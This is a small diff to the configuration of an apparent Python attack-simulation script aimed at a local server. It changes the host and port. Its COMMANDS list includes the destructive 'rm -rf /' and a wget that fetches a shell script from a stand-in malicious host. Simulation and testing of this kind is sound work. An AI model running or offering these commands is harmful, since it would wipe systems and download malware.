@@ -3,8 +3,8 @@ import time
 import random
 
 # Configuration
-SERVER_IP = 'localhost'  # Server IP address
-SERVER_PORT = 9999       # Server port number
+SERVER_IP = '127.0.0.1'  # Server IP address
+SERVER_PORT = 5000       # Server port number
 ATTACK_DURATION = 60     # Duration of the attack simulation in seconds
 COMMANDS = [
     'ls', 'pwd', 'echo $PATH', 'rm -rf /', 'wget http://malicious.com/malware.sh',
